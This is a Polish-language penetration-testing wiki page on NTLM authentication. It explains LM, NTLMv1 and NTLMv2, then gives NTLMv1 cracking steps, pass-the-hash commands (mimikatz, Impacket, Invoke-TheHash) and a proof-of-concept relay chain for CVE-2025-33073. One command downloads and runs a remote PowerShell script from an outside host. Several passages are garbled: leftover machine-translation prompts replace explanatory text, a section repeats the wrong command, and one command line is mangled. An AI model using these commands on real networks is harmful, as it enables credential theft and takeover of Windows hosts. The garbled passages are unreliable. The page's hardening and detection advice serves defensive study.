# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

W środowiskach, w których działają **Windows XP i Server 2003**, używane są hashe LM (Lan Manager), chociaż powszechnie wiadomo, że można je łatwo złamać. Konkretny hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje, że LM nie jest używany i reprezentuje hash pustego ciągu znaków.

Domyślnie podstawową metodą jest protokół uwierzytelniania **Kerberos**. NTLM (NT LAN Manager) jest używany w określonych sytuacjach: gdy nie ma Active Directory, domena nie istnieje, Kerberos nie działa z powodu nieprawidłowej konfiguracji lub gdy połączenia są nawiązywane przy użyciu adresu IP zamiast prawidłowej nazwy hosta.

Obecność nagłówka **„NTLMSSP”** w pakietach sieciowych wskazuje na proces uwierzytelniania NTLM.

Obsługa protokołów uwierzytelniania — LM, NTLMv1 i NTLMv2 — jest zapewniana przez konkretną bibliotekę DLL znajdującą się w `%windir%\Windows\System32\msv1\_0.dll`.

**Najważniejsze informacje**:

- Hashe LM są podatne na ataki, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza, że LM nie jest używany.
- Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używany tylko w określonych sytuacjach.
- Pakiety uwierzytelniania NTLM można rozpoznać po nagłówku „NTLMSSP”.
- Protokoły LM, NTLMv1 i NTLMv2 są obsługiwane przez plik systemowy `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Możesz sprawdzić i skonfigurować, który protokół będzie używany:

### GUI

Uruchom _secpol.msc_ -> Zasady lokalne -> Opcje zabezpieczeń -> Zabezpieczenia sieci: poziom uwierzytelniania LAN Manager. Dostępnych jest 6 poziomów (od 0 do 5).

![LM, NTLMv1 i NTLMv2 - GUI: Uruchom secpol.msc - Zasady lokalne - Opcje zabezpieczeń - Zabezpieczenia sieci: poziom uwierzytelniania LAN Manager. Dostępnych jest 6 poziomów (od 0 do 5)](<../../images/image (919).png>)

### Rejestr

Ustawi to poziom 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Możliwe wartości:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Podstawowy schemat uwierzytelniania domeny NTLM

1. **użytkownik** wprowadza swoje **dane uwierzytelniające**
2. Komputer kliencki **wysyła żądanie uwierzytelnienia**, przesyłając **nazwę domeny** i **nazwę użytkownika**
3. **Serwer** wysyła **challenge**
4. **Klient szyfruje** **challenge**, używając hasha hasła jako klucza, i wysyła go jako odpowiedź
5. **Serwer wysyła** do **Domain controller** **nazwę domeny, nazwę użytkownika, challenge i odpowiedź**. Jeśli **nie skonfigurowano** Active Directory lub nazwa domeny jest nazwą serwera, dane uwierzytelniające są **sprawdzane lokalnie**.
6. **Domain controller sprawdza, czy wszystko się zgadza**, i wysyła informacje do serwera

**Serwer** i **Domain Controller** mogą utworzyć **Secure Channel** za pośrednictwem serwera **Netlogon**, ponieważ Domain Controller zna hasło serwera (znajduje się ono w bazie **NTDS.DIT**).

### Lokalny schemat uwierzytelniania NTLM

Uwierzytelnianie przebiega tak jak opisano **wcześniej, ale** **serwer** zna **hash użytkownika**, który próbuje się uwierzytelnić, zapisany w pliku **SAM**. Zamiast więc pytać Domain Controller, **serwer sam sprawdzi**, czy użytkownik może się uwierzytelnić.

### NTLMv1 Challenge

**Długość challenge wynosi 8 bajtów**, a **odpowiedź ma długość 24 bajtów**.

**Hash NT (16 bajtów)** jest dzielony na **3 części po 7 bajtów** (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniana zerami**. Następnie **challenge** jest **szyfrowany osobno** za pomocą każdej części, a **wynikowe** zaszyfrowane bajty są **łączone**. Łącznie: 8B + 8B + 8B = 24 bajty.

**Problemy**:

- Brak **losowości**
- 3 części mogą być **atakowane osobno** w celu znalezienia hasha NT
- **DES można złamać**
- Trzeci klucz jest zawsze złożony z **5 zer**.
- Przy **tym samym challenge** **odpowiedź** będzie **taka sama**. Możesz więc przekazać ofierze jako **challenge** ciąg "**1122334455667788**" i zaatakować odpowiedź, używając **wstępnie obliczonych rainbow tables**.

### Atak NTLMv1

Obecnie coraz rzadziej można znaleźć środowiska ze skonfigurowanym Unconstrained Delegation, ale nie oznacza to, że nie można **nadużyć usługi Print Spooler**.

Możesz nadużyć niektórych danych uwierzytelniających/sesji, które już posiadasz w AD, aby **poprosić drukarkę o uwierzytelnienie** względem **hosta znajdującego się pod twoją kontrolą**. Następnie, używając `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić challenge uwierzytelniania na 1122334455667788**, przechwycić próbę uwierzytelnienia i, jeśli została wykonana przy użyciu **NTLMv1**, będzie można ją **złamać**.\
Jeśli używasz `responder`, możesz spróbować **użyć flagi `--lm`**, aby spróbować **obniżyć wersję** **uwierzytelniania**.\
_Należy pamiętać, że w przypadku tej techniki uwierzytelnianie musi być wykonywane przy użyciu NTLMv1 (NTLMv2 jest nieprawidłowy)._

Pamiętaj, że drukarka użyje podczas uwierzytelniania konta komputera, a konta komputerów używają **długich i losowych haseł**, których **prawdopodobnie nie uda się złamać** przy użyciu typowych **słowników**. Jednak uwierzytelnianie **NTLMv1** **używa DES** ([więcej informacji tutaj](#ntlmv1-challenge)), więc za pomocą usług przeznaczonych specjalnie do łamania DES będzie można je złamać (możesz na przykład użyć [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com)).

### Atak NTLMv1 za pomocą hashcat

NTLMv1 można również złamać za pomocą NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), który formatuje wiadomości NTLMv1 w sposób umożliwiający ich złamanie za pomocą hashcat.<sup>[[1]](#references)</sup>

Polecenie
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
zwróciłoby poniższe:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Uruchom hashcat (najlepiej rozproszone za pomocą narzędzia takiego jak hashtopolis), ponieważ w przeciwnym razie zajmie to kilka dni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
W tym przypadku znamy hasło do tego konta — jest nim `password` — więc na potrzeby demonstracji pójdziemy na skróty:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Teraz musimy użyć hashcat-utilities, aby przekonwertować złamane klucze DES na części hasha NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Na koniec ostatnia część:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the English text to translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Długość challenge wynosi 8 bajtów** i **wysyłane są 2 odpowiedzi**: jedna ma długość **24 bajtów**, a długość **drugiej** jest **zmienna**.

**Pierwsza odpowiedź** jest tworzona przez obliczenie **HMAC_MD5** dla **ciągu** złożonego z **klienta i domeny**, przy użyciu jako **klucza** **hasha MD4** z **NT hasha**. Następnie **wynik** jest używany jako **klucz** do obliczenia **HMAC_MD5** dla **challenge**. Do tego dodawany jest **client challenge o długości 8 bajtów**. Łącznie: 24 B.

**Druga odpowiedź** jest tworzona przy użyciu **kilku wartości** (nowy client challenge, **timestamp** zapobiegający **replay attacks**...)

Jeśli masz **pcap, w którym przechwycono pomyślny proces uwierzytelniania**, możesz skorzystać z tego poradnika, aby uzyskać domenę, username, challenge i response, a następnie spróbować złamać hasło: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Gdy masz już hash ofiary**, możesz użyć go, aby **się pod nią podszyć**.\
Musisz użyć **tool**, który **wykona** **uwierzytelnianie NTLM przy użyciu** tego **hasha**, **albo** możesz utworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, aby podczas wykonywania dowolnego **uwierzytelniania NTLM** używany był właśnie **ten hash**. To właśnie robi mimikatz.

**Pamiętaj, że ataki Pass-the-Hash możesz przeprowadzać również przy użyciu Computer accounts.**

### **Mimikatz**

**Musi być uruchomiony jako administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Spowoduje to uruchomienie procesu, który będzie należał do użytkownika, który uruchomił mimikatz, ale wewnętrznie w LSASS zapisane credentials będą tymi, które znajdują się w parametrach mimikatz. Następnie możesz uzyskać dostęp do zasobów sieciowych tak, jakbyś był tym użytkownikiem (podobnie jak w przypadku sztuczki `runas /netonly`, ale nie musisz znać hasła w plain-text).

### Pass-the-Hash z linux

Możesz uzyskać code execution na komputerach Windows, używając Pass-the-Hash z Linux.\
[**Kliknij tutaj, aby dowiedzieć się, jak to zrobić.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Skompilowane narzędzia Impacket dla Windows

Możesz pobrać [binaries impacket dla Windows tutaj](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (W tym przypadku musisz określić command; cmd.exe i powershell.exe nie są poprawne do uzyskania interaktywnego shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Istnieje jeszcze kilka innych binaries Impacket...

### Invoke-TheHash

Skrypty powershell możesz pobrać tutaj: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ta funkcja to **połączenie wszystkich pozostałych**. Możesz przekazać **kilka hostów**, **wykluczyć** niektóre z nich i **wybrać** **opcję**, której chcesz użyć (_SMBExec, WMIExec, SMBClient, SMBEnum_). Jeśli wybierzesz **SMBExec** lub **WMIExec**, ale **nie** podasz parametru _**Command**_, funkcja tylko **sprawdzi**, czy masz **wystarczające uprawnienia**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Musi zostać uruchomione jako administrator**

To narzędzie robi to samo co mimikatz (modyfikuje pamięć LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ręczne zdalne wykonywanie poleceń w Windows przy użyciu username i password


{{#ref}}
../lateral-movement/
{{#endref}}

## Wyodrębnianie credentials z Windows Host

**Więcej informacji na temat** [**sposobu uzyskiwania credentials z Windows host znajdziesz na tej stronie**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack to stealthy technika wyodrębniania credentials, która pozwala attackerowi uzyskać hashe NTLM z maszyny ofiary **bez bezpośredniej interakcji z procesem LSASS**. W przeciwieństwie do Mimikatz, który odczytuje hashe bezpośrednio z pamięci i jest często blokowany przez endpoint security solutions lub Credential Guard, ten attack wykorzystuje **lokalne wywołania pakietu uwierzytelniania NTLM (MSV1_0) za pośrednictwem Security Support Provider Interface (SSPI)**. Attacker najpierw **obniża ustawienia NTLM** (np. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), aby zapewnić możliwość użycia NetNTLMv1. Następnie podszywa się pod istniejące user tokens uzyskane z uruchomionych procesów i lokalnie wyzwala uwierzytelnianie NTLM, aby wygenerować odpowiedzi NetNTLMv1 przy użyciu znanego challenge.<sup>[[4]](#references)</sup>

Po przechwyceniu tych odpowiedzi NetNTLMv1 attacker może szybko odzyskać oryginalne hashe NTLM przy użyciu **precomputed rainbow tables**, umożliwiając dalsze ataki Pass-the-Hash w celu lateral movement. Co ważne, Internal Monologue Attack pozostaje stealthy, ponieważ nie generuje network traffic, nie wstrzykuje code ani nie uruchamia bezpośrednich memory dumps, co utrudnia jego wykrycie przez defenderów w porównaniu z tradycyjnymi metodami, takimi jak Mimikatz.

Jeśli NetNTLMv1 nie jest akceptowany z powodu wymuszonych security policies, attacker może nie uzyskać odpowiedzi NetNTLMv1.

Aby obsłużyć ten przypadek, narzędzie Internal Monologue zostało zaktualizowane: dynamicznie uzyskuje server token przy użyciu `AcceptSecurityContext()`, aby nadal **przechwytywać odpowiedzi NetNTLMv2**, jeśli NetNTLMv1 zawiedzie. Chociaż NetNTLMv2 jest znacznie trudniejszy do crackowania, nadal otwiera drogę do relay attacks lub offline brute-force w ograniczonych przypadkach.

PoC można znaleźć w **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay i Responder

**Bardziej szczegółowy guide dotyczący przeprowadzania tych attacków znajdziesz tutaj:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsowanie NTLM challenges z network capture

**Możesz użyć** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM i Kerberos *Reflection* przez Serialized SPNs (CVE-2025-33073)

Windows zawiera kilka mechanizmów ochronnych, które mają zapobiegać atakom *reflection*, w których uwierzytelnianie NTLM (lub Kerberos) pochodzące z hosta jest przekazywane z powrotem do **tego samego** hosta w celu uzyskania uprawnień SYSTEM.

Microsoft zablokował większość publicznych chainów za pomocą MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) oraz późniejszych poprawek, jednak **CVE-2025-33073** pokazuje, że zabezpieczenia nadal można obejść, wykorzystując sposób, w jaki **SMB client skraca Service Principal Names (SPNs)** zawierające *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR błędu
1. Attacker rejestruje **DNS A-record**, którego label koduje marshalled SPN – np.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Ofiara jest zmuszana do uwierzytelnienia się na tej hostname (PetitPotam, DFSCoerce itd.).
3. Gdy SMB client przekazuje string targetu `cifs/srv11UWhRCAAAAA…` do `lsasrv!LsapCheckMarshalledTargetInfo`, wywołanie `CredUnmarshalTargetInfo` **usuwa** serialized blob, pozostawiając **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (lub odpowiednik Kerberosa) uznaje teraz target za *localhost*, ponieważ krótka część hosta odpowiada nazwie komputera (`SRV1`).
5. W rezultacie server ustawia `NTLMSSP_NEGOTIATE_LOCAL_CALL` i wstrzykuje do contextu **SYSTEM access-token procesu LSASS** (w przypadku Kerberosa tworzony jest subsession key oznaczony jako SYSTEM).
6. Przekazanie tego uwierzytelniania za pomocą `ntlmrelayx.py` **lub** `krbrelayx.py` zapewnia pełne uprawnienia SYSTEM na tym samym hoście.<sup>[[5]](#references)</sup>

### Szybki PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Poprawki i środki zaradcze
* Poprawka KB dla **CVE-2025-33073** dodaje w `mrxsmb.sys::SmbCeCreateSrvCall` sprawdzenie, które blokuje każde połączenie SMB, którego cel zawiera informacje marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Wymuś **SMB signing**, aby zapobiec reflection nawet na niezałatanych hostach.
* Monitoruj rekordy DNS przypominające `*<base64>...*` i blokuj wektory coercion (PetitPotam, DFSCoerce, AuthIP...).

### Pomysły na detekcję
* Przechwycenia sieciowe z `NTLMSSP_NEGOTIATE_LOCAL_CALL`, w których adres IP klienta ≠ adres IP serwera.
* Kerberos AP-REQ zawierające klucz subsesji oraz principal klienta równy nazwie hosta.
* Logowania SYSTEM w zdarzeniach Windows 4624/4648, po których bezpośrednio następują zdalne zapisy SMB z tego samego hosta.<sup>[[5]](#references)</sup>

W przypadku **March 2026** local reflection variant, która wykorzystuje **SMB arbitrary ports** i **TCP connection reuse** do uzyskania `NT AUTHORITY\SYSTEM`, zobacz:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
